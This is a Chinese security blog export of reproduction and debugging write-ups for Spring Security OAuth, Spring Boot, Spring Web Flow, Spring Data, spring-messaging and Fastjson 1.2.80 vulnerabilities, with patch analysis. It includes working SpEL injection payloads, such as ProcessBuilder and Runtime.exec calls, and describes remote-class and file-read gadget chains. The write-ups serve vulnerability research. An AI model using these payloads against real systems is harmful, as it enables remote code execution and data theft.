[{"title":"Spring Security Oauth2 远程代码执行（CVE-2018-1260）","date":"2022-11-05T07:50:08.703Z","url":"/2022/11/05/Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2018-1260%EF%BC%89/","categories":[[" ",""]],"content":"前言官方公告： 漏洞描述恶意用户或攻击者可以向授权端点发出授权请求，当资源所有者被转发到批准端点时，这可能导致远程代码执行。 利用条件 服务端作为授权服务器时（有 @EnableAuthorizationServer 标注） 使用了默认审批终端，或重写的审批终端逻辑中对输出内容进行了 SPEL 表达式解析 未配置 Scopes 影响版本 Spring Security OAuth 2.3 到 2.3.2 Spring Security OAuth 2.2 到 2.2.1 Spring Security OAuth 2.1 到 2.1.1 Spring Security OAuth 2.0 到 2.0.14 环境搭建示例下载地址： 下载后导入 IDEA，并按照 README 构建一个alan-oauth数据库；配置 JDBC； 注意程序的 MySQL 版本要和本地的 MySQL 版本一致， application.properties中的配置和 JDBC 也要一致； 修改cn.com.sina.alan.oauth.config.OAuthSecurityConfig.configure(ClientDetailsServiceConfigurer clients)中代码的注释，scopes()设为空，即不配置； 启动程序，访问/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=，会跳转到/login，随便输入用户名和密码； 然后就会跳转到redirect_uri指定的地址上； 给scope传入表达式，会得到计算后的结果。 漏洞复现设置scope的值为命令执行代码，特殊符号要进行 url 编码，payload；/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri= 传入后跳到/login，随便输入用户名密码，提交，成功弹出计算器。 漏洞分析在/oauth/authorize对应的业务代码处下断点，org.springframework.security.oauth2.provider.endpoint.AuthorizationEndpoint.authorize()；经过了responseTypes和ClientId的判断，调用validateScope() 跟进validateScope() -&gt; validateScope(Set&lt;String&gt; requestScopes, Set&lt;String&gt; clientScopes)，验证作用域，requestScopes为传入的命令执行代码，clientScopes是configure()里配置的为 null； 经过一系列判断后调用getUserApprovalPageResponse()，获取用户批准页面的响应； 跟进，调用getUserApprovalRequest()把scope传入 model，然后返回 ModelAndView，view 是/oauth/confirm_access； 跳转到org.springframework.security.oauth2.provider.endpoint.WhitelabelApprovalEndpoint.getAccessConfirmation()； 跟进createTemplate()，替换一些template中是字符； createScopes()返回的内容如图； 返回的template如图； 回到getAccessConfirmation()，实例化 SpelView 类，这里不进行表达式解析； 返回 ModelAndView，一直到DispatcherServlet.doDispatch()，调用processDispatchResult()； 跟进processDispatchResult() -&gt; render() -&gt; render()； 跟进replacePlaceholders() -&gt; parseStringValue()，循环获取IQzoGU&#123; &#125;中的值； 当获取到 payload 后，跟进resolvePlaceholder()； 到SpelView.resolvePlaceholder()，解析表达式，触发命令执行； 可以看到strVal中有三个IQzoGU&#123; &#125;中含有 payload，所以会弹三次计算器。 补丁分析补丁地址： 修改了getAccessConfirmation()中生成视图的方式，不再使用SpelView； 还修改了createTemplate()方法。 参考链接："},{"title":"Spring Security Oauth RCE漏洞分析（CVE-2016-4977）","date":"2022-10-31T07:30:30.000Z","url":"/2022/10/31/Spring%20Security%20Oauth%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2016-4977%EF%BC%89/","categories":[[" ",""]],"content":"前言官方公告： 漏洞描述当使用 whitelabel 视图处理授权请求时，response_type参数值被作为 Spring SpEL 执行，这使得恶意用户能够通过创建response_type的值来触发远程代码执行。 影响版本 2.0.0 to 2.0.9 1.0.0 to 1.0.5 环境搭建漏洞环境下载地址： 下载解压后导入 IDEA，启动访问/oauth/authorize，需要登录，用户名是user，密码是password； 漏洞复现redirect_uri字段处，传入参数?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;new java.lang.ProcessBuilder(new java.lang.String(new byte[]&#123;99,97,108,99&#125;)).start()&#125;，弹出了计算器，说明表达式被执行了； response_type字段处：传入?response_type=$&#123;1000-1&#125;&amp;client_id=acme&amp;redirect_uri=，可以看到出现了计算后的值； 要在response_type字段处执行其他命令的话还需要对表达式进行处理。 漏洞分析从/oauth/authorize对应的方法看起，在org.springframework.security.oauth2.provider.endpoint.AuthorizationEndpoint.authorize()；先从传入的参数中获取response_type，判断它的值是否包含token或code，如果都不包含就抛异常；下面获取了redirect_uri的值，调用resolveRedirect； 在配置文件中指定了允许的grant-types只有三种，默认的redirect-uri是； 跟进resolveRedirect()，进入 else 分支； 抛出异常； 返回到doDispatch()中，调用processDispatchResult()； 跟进，获取到当前报错对应的 view 是/oauth/error，然后跳转； 到/oauth/error对应的方法中，把 error 信息取出进行 html 编码后赋给errorSummary，传进 model，然后 new 了 SpelView； 这里不进入resolvePlaceholder()； 返回 ModelAndView，在doDispatch()中调用processDispatchResult()； 跟进到SpelView.render()，this.template和this.resolver是在上面 new SpelView 时被赋值的； parseStringValue()中取出了$&#123; &#125;中的errorSummary，调用resolvePlaceholder()； 获取到errorSummary值，返回； 然后再递归调用一次parseStringValue()； 取出$&#123; &#125; 中的命令执行代码，带入resolvePlaceholder()； 这下就会触发命令执行代码了。 补丁分析补丁地址： 调用RandomValueStringGenerator().generate()随机生成了一个前缀； 把template中的$&#123;换成了随机字符+&#123;，带入replacePlaceHolders()，跟进到parseStringValue()，取出随机字符+&#123; &#125;中的 error；然后递归调用parseStringValue()时，又去取随机字符+&#123; &#125;中的值，但是我们传入的 payload 是$&#123; &#125;包裹的，所以取不到，不会进入resolvePlaceholder()解析表达式。 参考链接："},{"title":"Spring Boot Actuator 命令执行漏洞分析（CNVD-2019-11630）","date":"2022-10-10T07:34:30.000Z","url":"/2022/10/10/Spring%20Boot%20Actuator%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CNVD-2019-11630%EF%BC%89/","categories":[[" ",""]],"content":"前言Actuators是Spring Boot简化Spring开发过程中所提出的四个主要特性中的一个特性；Spring Boot Actuator存在命令执行漏洞，攻击者可通过构造恶意请求利用该漏洞执行任意命令。 影响版本 Spring Boot 1-1.4 Spring Boot 2.x 漏洞公告： 环境搭建本文分析h2 database query 利用链，更多利用方式参考：示例下载地址： 导入 IDEA 即可。 该示例的 Spring Boot 是 2.x 版本的，访问/actuator和/actuator/env可以看到其暴露的信息。 restart h2 database query RCE漏洞复现访问/actuator/env抓包，改为 POST 请求，把Content-Type改为application/json，传入 json 数据； 然后再访问/actuator/restart抓包，同样改为 POST 请求，把Content-Type改为application/json，传入空 json；成功弹出计算器。 漏洞分析配置不当关于 Actuator 端点的文档见： 端点可以让使用者监视应用程序并与之交互，可以通过配置文件来启用或禁用某个端点，只有当端点为启用和公开时，可以通过 URL 来直接访问； 部分端点所包含的信息： beans：显示应用程序中所有 Spring bean 的完整列表； caches：公开可用的缓存； env：显示 spring 的环境配置； health：显示应用程序运行状况信息； info：显示任意应用程序信息。 在 SpringBoot 的配置文件中配置端口的启用，如本实例中的配置文件application.properties； SpringBoot 2.0.5 版本的 env 端点默认开启，参数是以 JSON 格式接收；（官方文档） 所以因为配置不当，导致暴露了重要信息接口，从而使攻击者可修改环境配置。 HikariCP数据库连接池因为引入了spring-boot-starter-jdbc，所以默认使用 HikariCP 数据库连接池；HikariCP 数据库连接池的部分配置参数如下： 当一个WEB应用程序向 HikariCP 数据库连接池发送一个数据库连接请求时，会首先执行spring.datasource.hikari.connection-test-query参数的 SQL 语句来测试是否允许建立连接；也就是说，如果给spring.datasource.hikari.connection-test-query参数传入任意 SQL 语句都会被执行；刚好可以通过/env端点来修改环境配置。 H2 数据库H2 数据库有一个特性，允许用户自定义 Java 函数；（官方文档） 使用如下语句给函数代码定义一个别名并调用该函数： 下面的代码定义了一个shellexec函数，作用是执行命令； Spring CloudSpring Boot Actuator 本身不支持 POST 方法去请求 env 端点； 而Spring Cloud 中提到，对于 Spring Boot Actuator 应用程序，还有一些额外的管理端点： 使用 POST 方式来通过/env更新 Environment ，和重新绑定 @ConfigurationProperties 和日志级别 /refresh用于重新加载引导上下文并刷新 @RefreshScopebean /restart用于关闭 ApplicationContext 并重新启动它（默认禁用） /pause和/resume用于调用 Lifecycle 方法 所以，需要引入 Spring Cloud 才能对环境配置进行修改，/refresh和/restart都可以刷新数据库连接。 参考链接："},{"title":"Spring Boot框架SPEL表达式注入漏洞（CNVD-2016-04742）","date":"2022-10-10T07:33:30.000Z","url":"/2022/10/10/Spring%20Boot%E6%A1%86%E6%9E%B6SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2016-04742%EF%BC%89/","categories":[[" ",""]],"content":"前言影响版本Spring Spring Boot &gt;&#x3D;1.1，&lt;&#x3D;1.3.0 漏洞说明： 环境搭建历史版本下载地址： 创建 Maven 工程，Archetype选择org.apache.maven.archetypes:maven-archetype-webapp； 在pom.xml中引入漏洞版本的 Spring Boot 和 web 依赖： 写一个 Controller，传入 payload 参数，抛出异常： 漏洞复现访问，传入：?payload=$&#123;new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]&#123;99,97,108,99&#125;)).start()&#125; 返回 ProcessImpl 对象并弹出计算器。 漏洞分析打断点到StandarHostValve.invoke()方法的 75 行，在这里从 request 中获取异常信息，获取到 TestController 中抛出的 IllegalStateException，所以在 82 行调用throwable()； 跟进，取出java.lang.IllegalStateException进行一系列判断，最有设置状态码为 500； 一直跟到ErrorMvcAutoConfiguration$SpelView.render()，调用replacePlaceholders()替换占位符；template是 500 页面的报错信息，resolver就是 context； 跟进replacePlaceholders() -&gt; parseStringValue()，循环从 500 页面信息代码中取出$&#123; &#125;中间的数据，调用resolvePlaceholder()，当获取到message 时，跟进； 到resolvePlaceholder()，调用expression.getValue()，返回传入的payload； 回到parseStringValue()，递归调用parseStringValue()方法，带入的参数是 payload；然后同样只截取$&#123; &#125;中的内容，带入resolvePlaceholder()； 最后调用expression.getValue()，触发命令执行。 调用链： 补丁分析在 1.3.1.RELEASE 版本中，新增了NonRecursivePropertyPlaceholderHelper类，不用原来的PropertyPlaceholderHelper； 在带入 payload 递归调用到parseStringValue()时，接着调用的是NonRecursivePropertyPlaceholderHelper$NonRecursivePlaceholderResolver.resolvePlaceholder()； 在该方法中判断了resolver是否是 NonRecursivePlaceholderResolver 类型，这里为 true ，所以返回 null，不再对表达式进行解析。"},{"title":"Spring Web Flow 数据绑定表达式漏洞分析（CVE-2017-4971）","date":"2022-10-10T07:32:30.000Z","url":"/2022/10/10/Spring%20Web%20Flow%20%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2017-4971%EF%BC%89/","categories":[[" ",""]],"content":"前言漏洞描述不更改默认禁用（即设置为“false”）的MvcViewFactoryCreator useSpringBinding属性值的应用程序可能容易受到视图状态中恶意EL表达式的攻击，这些视图状态处理表单提交，但没有子元素来声明显式数据绑定属性映射。 影响版本Spring Web Flow 2.4.0 to 2.4.4 漏洞说明： 环境搭建示例下载地址： 将/booking-mvc导入 IDEA，手动将 SWF 版本改为漏洞版本，不然我这儿会报错； 把WebFlowConfig.mvcViewFactoryCreator()方法中的 true 改为 false；factoryCreator.setUseSpringBeanBinding(false)因为在org.springframework.webflow.mvc.builder.createViewFactory()方法中，如果useSpringBeanBinding为 true ，则使用BeanWrapperExpressionParser作为表达式解析器，无法触发命令执行； 启一个 Tomcat，访问看到主页； 漏洞复现点击login，可以用给出的账号密码进行登录； 按照如下步骤随便选择一家酒店进行预定； 最后点击confirm并抓包； 在 POST 数据后面添加如下payload：&amp;_(new+java.lang.ProcessBuilder(&quot;calc.exe&quot;)).start()=blckder02 发送，成功弹出计算器。 漏洞分析首先看一下视图执行流程，在/webapp/WEB-INF/hotels/booking/booking-flow.xml中；enterBookingDetails就表示预定详情页面，点击proceed按钮就跳转到reviewBooking查看预定信息页面，再点击confirm按钮就跳转到bookingConfirmed确认预定页面，与上面复现的流程一致；enterBookingDetails和reviewBooking页面都绑定了指定的 model，bookingConfirmed页面没有绑定 model； 抓包修改参数后，断点到ViewState.resume()方法，从这里看起；现在属于是reviewBooking页面跳往bookingConfirmed页面的过程中，所以目前的 viewId 是reviewBooking，返回一个mvcView； set 进 context，接着调用handleEvent()； 跟进handleEvent() -&gt; view.processUserEvent()，开始处理用户事件，也就是进行点击comfirm后的流程；获取到事件名称comfirm，model 是从reviewBooking视图获取的，就是绑定的booking，调用bind()； 当前已经是bookingConfirmed视图流程，获取到了所有参数，由于没有绑定 model 信息，所以binderConfiguration为 null，进入 else 分支； 跟进addDefaultMappings()，遍历参数，判断参数名前是否有_，有的话就去掉，然后调用addEmptyValueMapping； 当获取到传入的 payload 时跟进，进行表达式解析，调用getValueType()，和其它 spring 漏洞中的getValue()作用一样，成功执行命令； 补丁分析补丁地址： 在org.springframework.webflow.mvc.view.AbstractMvcView中，使用BeanWrapperExpressionParser作为表达式解析器； 该类的getValueType()方法时调用getPropertyType()方法来获取属性的类型，返回的是 null ，不能触发命令执行； 原来使用的是默认解析器，跟进getValueType()实例化了processBuilder，所以能触发命令执行； 参考链接："},{"title":"Spring-Data-Commons RCE漏洞分析（CVE-2018-1273 ）","date":"2022-10-10T07:31:30.000Z","url":"/2022/10/10/Spring-Data-Commons%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-1273%20%EF%BC%89/","categories":[[" ",""]],"content":"前言Spring Data Commons 出现的远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。 影响版本： Spring Data Commons 1.13 to 1.13.10 (Ingalls SR10) Spring Data REST 2.6 to 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 to 3.0.5 (Kay SR5) Older unsupported versions are also affected 环境搭建下载一个较老版本的 spring-data-examples： 只用将 web 目录下的 example项目导入 IDEA 即可；Spring Data Commons 版本为 1.13.0。 漏洞复现访问/users，发送任意信息； 抓包修改为如下 POST 数据：username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=11&amp;password=22&amp;repeatedPassword=22 发送，触发命令执行： 在该示例程序中，也可用如下payload，其他版本的示例可能不适用：username[T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)]=11&amp;password=22&amp;repeatedPassword=22 漏洞分析从org.springframework.data.web#createAttribute()打各断点，52 行从 request 中获取参数，new 成 MutablePropertyValues 类对象，调用bind()； 获取到两个 GET 参数和三个 POST 参数，调用doBind()； 跟进doBind()，检查了参数名是否以!和_开头，是的话要进行处理，我们传的传参数不是，所以不做处理直接进行下一步； 跟进父类doBind()，也会调用两个 check 方法，都不做处理；跟进applyPropertyValues() -&gt; setPropertyValues()，遍历参数列表，调用到MapDataBinder$MapPropertyAccessor.setPropertyValue()； if 语句首先调用isWritableProperty()进行校验，跟进到getPropertyInformation()方法，在UserController$UserForm寻找当前参数信息； page参数和size参数都不在UserForm中，所以抛出异常，继续遍历下一个； 遍历到username参数时，能从UserForm中获取到信息，所以进入MapDataBinder$MapPropertyAccessor.setPropertyValue()的 else 分支； 然后就创建 StandardEvaluationContext 对象，将 username 参数作为表达式传入进行解析；调用setValue()触发命令执行； 部分调用链： 参考文章： "},{"title":"spring-messaging RCE 分析（CVE-2018-1270）","date":"2022-10-10T07:30:30.000Z","url":"/2022/10/10/spring-messaging%20RCE%20%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-1270%EF%BC%89/","categories":[[" ",""]],"content":"环境搭建到 GitHub 上下载 2.0.0.RELEASE 版本的示例环境，然后导入 IDEA 即可： 访问如下图，点击 Connect ，然后输入内容点击 Send，就会输出字符串； 漏洞复现F12 找到app.js的connect()方法，添加如下代码并保存：var header = &#123;&quot;selector&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)&quot;&#125;; 重新 Connect，输入内容点击 Send，成功触发命令执行。 T(Type)表示java.lang.Class实例，Type 必须是类全限定名，java.lang包除外； 也可以用如下代码，new 一个实例：var header = &#123;&quot;selector&quot;:&quot;new java.lang.ProcessBuilder((new java.lang.String[] &#123;&#39;calc.exe&#39;&#125;)).start()&quot;&#125;; 漏洞分析在org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java的addSubscriptionInternal()方法处打一个断点，点击 Connect 后会停在这里；进行了一系列赋值，并把selectorHeaderInUse设为了 ture(默认是 false)，后面会用到； ast在InternalSpelExpressionParser.doParseExpression()被赋值，后面会用到； 然后调用addSubscription()添加该订阅信息； Connect 流程走完后，输入内容点击 Send；经过一系列消息处理，在SimpleBrokerMessageHandler.handleMessageInternal()中调用了sendMessageToSubscribers()，也就是向订阅服务器发送消息，message中保存了此次会话的一些信息； 跟进到findSubscriptions()，获取到destination，调用findSubscriptionsInternal()； 跟进findSubscriptionsInternal()，获取到result； 跟进filterSubscriptions()，首先就判断了selectorHeaderInUse的值，前面在 Connect 的时候把该值赋为了 true，进入 else 语句；(重启了一次，只是sessionId变了，其他都一样)获取到ssionId、subId，从而获取到sub，然后取出其中的 selector 表达式； 调用expression.getValue()； 跟进可以看到获取了 Runtime 实例，所以触发命令执行。 调用链： "},{"title":"Fastjson 1.2.80 分析","date":"2022-09-26T11:30:00.000Z","url":"/2022/09/26/Fastjson%201.2.80%20%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言该漏洞由浅蓝研究发现，可在特定条件下绕过 AutoType 关闭限制加载远程对象进行反序列化。 影响版本： 特定依赖存在下影响 ≤1.2.80。 漏洞公告： Groovy环境搭建 Fastjson 1.2.80 Groovy 3.0.8 JDK 8u12 在 pom.xml中导入依赖： 漏洞复现构造恶意类，要有@GroovyASTTransformation注解，并且实现ASTTransformation接口； 起一个服务端，把恶意类的 class 文件放到根目录下，再创建一个META-INF/services/org.codehaus.groovy.transform.ASTTransformation文件，在文件中写入恶意类的名称；python -m http.server 8081 POC，classpathList为远程服务端地址； 命令执行成功； POC 调试在parseObject()中获取到第一个@type字段中的类名，带入checkAutoType()； 从mapping中获取到了 clazz，然后返回java.lang.Exception； 因为java.lang.Exception是继承 Throwable 类的，所以获取到的是ThrowableDeserializer类型的deserializer；这里目的是要利用ThrowableDeserializer.deserializer()中调用的checkAutoType()方法中第二个参数不为 null ，和 1.2.68 版本的绕过原理一样； 跟进deserialze()，获取到第二个@type字段中的类名，带入checkAutoType()； 跟进，expectClass参数值为Throwable.class，所以expectClassFlag赋为 true； 然后进行黑名单校验，CompilationFailedException不在黑名单中，能顺利通过校验； 因为expectClassFlag为 true， 所以在1185 行加载了CompilationFailedException，可以绕过后面对 AutoType 的校验，并且 1190 行把它添加进了 mapping； 跟进到ThrowableDeserializer.deserialze()，调用了cast()，成员变量类型是ProcessingUnit； 跟进TypeUtils.cast()，调用castToJavaBean(); 获取到JavaBeanDeserializer类型的deserializer； 获取到deserializer之后，把org.codehaus.groovy.control.ProcessingUnit put 进了this.deserializers，这是后面绕过 AutoType 校验的关键！ 1195 行进行实例化，实例化的结果是 null ； 返回 null 值，调用setValue()进行赋值，由于值为 null ，抛出异常； 然后进入 POC 的 catch 分支，反序列化 poc2。 获取到第一个@type字段，带入checkAutoType()； 因为前面 把ProcessingUnit put 进this.deserializers了，所以这里可以直接从this.deserializers中找到ProcessingUnit，返回 clazz； 获取到JavaBeanDeserializer类型的deserializer，调用deserialze()； ref是第二个@type值JavaStubCompilationUnit，expectClass是ProcessingUnit类，带入checkAutoType()； 跟进，expectClassFlag为true，在 1185 行加载JavaStubCompilationUnit，并且将它添加进 mapping； 调用JavaBeanDeserializer.deserialze()； 跟进调用了parseField()； 跟进调用了deserialze()，返回的value是 CompilerConfiguration 类型，并且把传入的远程地址赋给了classpath； 117 行又把整个 CompilerConfiguration 对象赋给JavaStubCompilationUnit的config参数； 在 982 行的 for 循环中，从fieldValues中获取参数值存入params[]中，因为我们值给config传了值，所以params[]只有一个参数值； 1044 行 new 了一个JavaStubCompilationUnit对象； JavaStubCompilationUnit 的构造方法有三个参数，第一个参数是我们自定义的，第二个参数是调用setClassLoader()获取的，第三个参数是 null；setClassLoader()中 new 了 GroovyClassLoader 对象； 跟到GroovyClassLoader的构造方法，从config中获取classpath添加进GroovyClassLoader对象； 返回到CompilationUnit构造方法，184 行调用了addPhaseOperations()，跟进再调用了ASTTransformationVisitor.addPhaseOperations() ； 跟进addGlobalTransforms() -&gt; doAddGlobalTransforms()，transformLoader是从JavaStubCompilationUnit对象中获取到的GroovyClassLoader；使用getResource()从加载器中获取META-INF/services/org.codehaus.groovy.transform.ASTTransformation文件下的资源 跟进getResource()，可以看到，加载资源遵循双亲委派型，会首先委托父类加载器，委托到启动类加载器时，会从 Bootstrap classpath 对应的 jar 包或目录中加载资源； getBootstrapClassPath()最终获取到的时bcp字段的值，也就是说从bcp中的 jar 包中加载资源； 然后调用findResources()，跟进，再调用ucp的findResources()，ucp是 URLClassPath 类型，一共会调用三次ucp.findResources()，每次的ucp都不一样； 因为每次的类加载器不一样，所以 ucp 不一样，第三次是从远程地址加载资源； 资源加载进来后，就开始逐行读取每个资源的内容，把不以#开头的行放到transformNames中； 循环到第三次globalServices时，transformNames中已经有四个值了； 跟进hasMoreElements() -&gt; next() -&gt; 第二次的hasMoreElements() -&gt; next() -&gt; e.hasMoreElements() -&gt; next()； 跟进findResource()，创建了与远程地址资源的 http 连接，设置请求头为HEAD，对远程资源进行探测； 然后读取远程资源，使用了URLStreams.openUncachedStream()； 跟进可以看到调用getInputStream()，向远程资源发起了 http 请求； 命令行中可以看到两次请求的记录； 然后也是将远程资源中的内容读到transformNames中，这样就获取到恶意类的名称； 接着下面调用addPhaseOperationsForGlobalTransforms()； 跟进，在该方法中依次加载并实例化了transformNames中的所有类； 校验了加载的类上是否含有@GroovyASTTransformation注解，所以在构造恶意类时要加上注解；并且得实现或继承ASTTransformation接口，所以恶意类要实现ASTTransformation，然后实例化触发命令执行。 jython+spring-context+postgresql环境搭建 Fastjson 1.2.80 jython 1.1 spring-context 5.0.2.RELEASE postgresql 42.3.0 (42.3.0 &lt; 版本 &lt; 42.3.2) 在 pom.xml中添加如下依赖： 漏洞复现利用org.springframework.context.support.ClassPathXmlApplicationContext来加载远程指定的 XML 配置文件，在配置文件中定义一个 bean ，bean 中通过使用 Spring EL 表达式来调用java.lang.ProcessBuilder的start()方法来执行命令。 构造 bean 文件spel.xml： 起一个服务端，把 bean 文件放在根目录下； 构造POC： ParseException继承Exception的子类，有一个PyObject类型参数type； PyConnection继承PyObject，有一个Connection类型的参数connection； PgConnection实现了Connection的子接口，构造函数中有的五个参数，连接了数据库。 host、port、user、database参数值可以随便传，不影响命令执行；socketFactory得是ClassPathXmlApplicationContext，socketFactoryArg是远程 bean 文件地址。 POC 调试首先对a进行反序列化，原理作用和 Groovy 链一样；获取到第一个@type的值java.lang.Exception，带入checkAutoType()；从 mapping 中获取并返回 clazz； Exception继承了Throwable，所以下面调用ThrowableDeserializer.deserialze，接着获取到第二个@type的值，带入checkAutoType()，第二个参数值不为 null； expectClassFlag为 true ，加载ParseException类并返回； 获取了type参数的类型，调用cast()； 跟进到castToJavaBean()，把PyObject类型 put 进了this.deserializer，为后面绕过 AutoType 检测做准备； 返回的value不为 null，所以下面调用setValue()不会报错，所以不用像 Groovy 链那样使用try-catch。 然后接着反序列化b，获取到第一个@type值带入checkAutoType()，能直接从this.deserializer获取到clazz； PyObject对应的deserializer类型是FastjsonASMDeserializer_1_PyObject，但还是调用的JavaBeanDeserializer.deserialze()； 获取到第二个@type的值带入checkAutoType()，第二个参数不为 null； 加载并返回PyConnection； 跟进JavaBeanDeserializer.deserialze() -&gt; DefaultFieldDeserializer.parseField() -&gt; getFieldValueDeserilizer()，返回JavaBeanDeserializer类型； 调用deserialze()，经过一堆没什么用的循环，获取了下一个@type的值，带入checkAutoType()，第二个参数不为null； 加载并返回PgConnection； 调用deserialze()，遍历到hostSpecs参数时，逐步调用到getFieldValueDeserilizer()，返回一个ObjectArrayCode类型； 然后调用ObjectArrayCode.deserialze()； 跟进parserArray()，调用deserialze()； 获取host和port参数值，实例化了一个HostSpec对象并返回； 把HostSpec对象转换为数组类型，赋给hostSpecs参数； 接着调用paseField() ，跟进到 MapDeserializer.deserialze()，调用了parseObject()； 在parseObject()中把socketFactory和socketFactoryArg的存入了 map 中； 然后将info放入了fieldValues，另外几个参数赋值都差不多； 参数全部赋值完毕后，实例化一个PgConnection对象； 跟进到PgConnection的构造函数，调用了ConnectionFactory.openConnection()； 逐步跟进到getSocketFactory()，调用了ObjectFactory.instantiate()； 反射获取了ClassPathXmlApplicationContext类和构造函数，最后实例化ClassPathXmlApplicationContext对象； 加载配置文件，实例化文件中的恶意对象。 aspectj 读文件环境搭建 Fastjson 1.2.80 aspectj 1.8.6 在pom.xml中导入依赖： 漏洞复现直接来看看网上普遍使用的POC，要分三次打： 由于SourceTypeCollisionException的newAnnotationProcessorUnits参数是接口类型； 会在TypeUtils.castToJavaBean()中返回一个代理对象，并不会像前两条链一样将ICompilationUnit put 进this.deserializer； 所以 jsonStr1 中不添加newAnnotationProcessorUnits参数，它的作用是把SourceTypeCollisionException添加进mapping，以便后面使用。 MiscCodec.deserialze()中调用了toJavaObject()，可以把数组类型的参数转换成 Java 对象，然后把该参数类型 put 进this.deserializer；MapDeserializer.deserialze()可以把传入的各参数的值赋给对应的对象； jsonStr2 中 各类对应的deserializer如下： Class deserializer java.lang.Class MiscCodec java.lang.String StringCode java.util.Locale MiscCodec com.alibaba.fastjson.JSONObject MapDeserializer jsonStr2 的作用就是将org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit类型 put 进this.deserializer；同时构造 json 语法错误，使之抛出异常，进入下一个反序列化。 jsonStr3 的作用就是利用BasicCompilationUnit类中的getContents()方法来读取文件内容；&quot;x&quot;:&#123;&#125;的作用是将BasicCompilationUnit对象序列化为 JSON 数据，否则输出结果如下： 经过分析发现，其实 jsonStr2 简化为如下代码，同样可以实现读文件。 POC 调试获取到第一个@type的值，带入checkAutoType()，从mapping中获取并返回Exception； 调用ThrowableDeserializer.deserialze()，获取到第二个@type的值，带入checkAutoType()，expectClassFlag为 true，加载并返回SourceTypeCollisionException，还把SourceTypeCollisionException添加进了mapping，这是后面绕过 AutoType 关闭限制的关键； 然后创建并返回一个 Exception ，结束第一个反序列化。 开始对第二个字符串进行反序列化，获取到第一个@type的值，带入checkAutoType()，从this.deserializers中获取并返回Class； 然后调用MiscCodec.deserialze()； 获取到第二个@type的值，带入checkAutoType()，从mapping中获取并返回String； 接着调用StringCode.deserialze()，获取到下一个@type的值，带入checkAutoType()，从mapping中获取并返回Locale； 调用MiscCodec.deserialze()，获取到下一个@type的值，直接在 310 行获取到com.alibaba.fastjson.JSONObject，不用再调用checkAutoType()；接着往下就是调用MapDeserializer.deserialze()； 获取到java.lang.String，然后调用StringCode.deserialze()，返回@type； 接着分别获取后面的两个值，存入map； 一直返回到MiscCodec.deserialze()，调用了toJavaObject()； 跟进toJavaObject() -&gt; TypeUtils.cast() -&gt; cast() -&gt; castToJavaBean()，获取SourceTypeCollisionException带入checkAutoType()，从mapping中获取并返回 clazz；然后又调用castToJavaBean()； 跟进createInstance()，获取到ICompilationUnit[]类型的参数newAnnotationProcessorUnits，调用parseField() -&gt; getFieldValueDeserilizer() -&gt; getDeserializer()；因为参数是数组类型，所以得到ObjectArrayCode类型的deserializer，然后把它 put 进this.deserializer，这里的type是带[L...;字符的； 调用ObjectArrayCode.deserialize()，获取到interface org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit，带入parseArray()；跟进到getDeserializer()将ICompilationUnit接口类型的deserializer put 进this.deserializer，这里就和前面两条链的目的一样，为后续绕过 AutoType 做准备； 然后逐步返回，到结束反序列化时，抛出了一个异常，由于构造的 json 字符串闭合不正确； 接着就进入到 catch 分支，对第三个 json 数据进行反序列化。 获取到第一个@type，带入checkAutoType()，从this.deserializer中找到并返回ICompilationUnit类； 接着调用deserialize()，获取到第二个@type的值，带入checkAutoType()，第二个参数不为 null； 加载并返回BasicCompilationUnit，然后调用deserialize()； 跟进，在deserialize()中把BasicCompilationUnit类型中不为 null 的参数放到params中，然后实例化该类； 最后返回JSONObject对象，到这里还没读到文件中的内容； 继续跟进println()，到MapSerializer.write()，再继续跟进，看不到调试过程了； 但是一直点，会跳到BasicCompilationUnit.getContents()，这里将D:/1.txt转换为 File 对象，调用了Util.getFileCharContent()； 在getFileCharContent()中创建输入流，以字符数组的形式读取文件中的内容； 然后就是返回、输出文件内容。 补丁分析更新到 1.2.83 版本。checkAutoType()中，在从mapping获取到 java.lang.Execption后，添加了一个校验；如果满足expectClass为 null 、clazz不为 null 、clazz实现或继承Throwable.class、未开启 AutoTpye，那把 clazz赋为 null； 最后只能返回一个 null。 参考连接："},{"title":"Spring MVC 笔记","date":"2022-09-19T11:33:30.000Z","url":"/2022/09/19/Spring%20MVC/","categories":[[" ",""]],"content":"前言MVCMVC是什么？MVC模式，全程为Model-View-Controller(模型-视图-控制器)模式，他是一种软件架构模式，其目标是将软件的用户界面和业务逻辑分离，使代码具有更高的可扩展性、可复用性、可维护性以及灵活性。如下图所示： 各部分的作用如下： Model： 它是应用程序的主体部分，主要由以下 2 部分组成： 实体类 Bean：专门用来存储业务数据的对象，它们通常与数据库中的某个表对应，例如 User、Student 等； 业务处理 Bean：指 Service 或 Dao 的对象，专门用于处理业务逻辑、数据库访问。 一个模型可以为多个视图（View）提供数据，一套模型（Model）的代码只需写一次就可以被多个视图重用，有效地减少了代码的重复性，增加了代码的可复用性。 View： 